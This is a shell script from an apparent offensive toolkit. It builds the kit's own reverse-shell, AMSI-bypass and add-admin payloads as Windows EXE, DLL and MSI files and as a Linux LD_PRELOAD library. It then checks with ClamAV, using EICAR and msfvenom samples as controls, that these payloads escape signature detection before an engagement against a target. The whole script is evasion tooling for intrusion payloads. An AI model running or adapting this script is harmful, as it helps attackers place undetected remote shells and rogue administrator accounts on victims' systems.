#!/bin/sh
# ===================================================================================================
# avcheck.sh — STATIC-SIGNATURE floor test for the kit's payloads (ClamAV, fully offline, no sample
# sharing). Generates the REAL payloads this kit produces, scans them, and includes known-bad CONTROLS
# (EICAR + msfvenom) that MUST flag — so a clean result on our payloads is meaningful, not a broken scan.
#
# HONEST CEILING: ClamAV is a *lower bound*. A CLEAN result here does NOT prove Windows Defender / EDR
# won't catch it (those add behavioral + ML detection). A FLAGGED result means it's trivially caught —
# fix it before you go near a target. Run this before an engagement, and after any payload change.
#
# Usage:  sh avcheck.sh
# ===================================================================================================
HERE=$(cd "$(dirname "$0")" && pwd); ROOT="$HERE/.."
command -v clamscan >/dev/null || { echo "clamscan not installed (apt install clamav; freshclam)"; exit 1; }
WORK=$(mktemp -d); cd "$WORK" || exit 1
echo "workdir: $WORK"
echo "== generating the kit's real payloads =="

# --- OUR payloads (want: CLEAN) ---
for act in revshell revshell_amsi add_admin; do
    python3 "$ROOT/winpriv/gen_payload.py" exe --action "$act" --name "our_${act}"    >/dev/null 2>&1
    x86_64-w64-mingw32-gcc         -o "our_${act}.exe"    "our_${act}.c"    2>/dev/null
    python3 "$ROOT/winpriv/gen_payload.py" dll --action "$act" --name "our_${act}dll" >/dev/null 2>&1
    x86_64-w64-mingw32-gcc -shared -o "our_${act}dll.dll" "our_${act}dll.c" 2>/dev/null
done
python3 "$ROOT/winpriv/gen_msi.py" --action revshell --backend wixl --name our_wixl.msi >/dev/null 2>&1
wixl -o our_wixl.msi our_wixl.wxs 2>/dev/null
python3 "$ROOT/linpriv/gen_preload.py" --action revshell --name our_pre.so >/dev/null 2>&1
gcc -shared -fPIC -o our_pre.so our_pre.c 2>/dev/null

# --- CONTROLS (want: FLAGGED — proves the scanner + signatures work) ---
# EICAR (the universal AV test string — must always flag if the DB is loaded):
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > ctrl_eicar.com
# msfvenom output (the thing we default AWAY from — should flag, validating the wixl default):
if command -v msfvenom >/dev/null; then
    msfvenom -p windows/x64/exec CMD=calc.exe -f exe -o ctrl_msfvenom.exe </dev/null >/dev/null 2>&1
    msfvenom -p windows/x64/exec CMD=calc.exe -f msi -o ctrl_msfvenom.msi </dev/null >/dev/null 2>&1
fi

echo "== scanning with ClamAV =="
clamscan --no-summary -r "$WORK" 2>/dev/null > scan.txt
db=$(sigtool --info /var/lib/clamav/daily.c*d 2>/dev/null | grep -i version | head -1)
[ -n "$db" ] && echo "  (sig DB: $db)"

verdict() { grep "$1" scan.txt | sed "s#$WORK/##"; }
our_flag=$(grep 'our_' scan.txt | grep -c FOUND)
ctrl_ok=$(grep 'ctrl_' scan.txt | grep -c FOUND)
ctrl_tot=$(ls ctrl_* 2>/dev/null | wc -l)

echo ""
echo "===== OUR PAYLOADS (want: every line 'OK') ====="; verdict 'our_'
echo ""
echo "===== CONTROLS (want: 'FOUND' — proves the scan works) ====="; verdict 'ctrl_'
echo ""
echo "======================================================================"
if [ "$ctrl_ok" -eq 0 ]; then
    echo "  ! SCAN NOT TRUSTWORTHY: no control flagged — signature DB likely not loaded (run: sudo freshclam)."
elif [ "$our_flag" -eq 0 ]; then
    echo "  PASS (static floor): $ctrl_ok/$ctrl_tot controls flagged, 0 of our payloads flagged by ClamAV."
    echo "  -> our native XOR'd payloads clear the static-signature floor. This is NOT a Defender/EDR pass."
else
    echo "  FAIL: $our_flag of our payloads were FLAGGED by ClamAV — trivially detectable. Investigate above."
fi
echo "======================================================================"
echo "  Reminder: ClamAV is a floor. The real test is Windows Defender / the target's EDR on a live box."
rm -rf "$WORK"
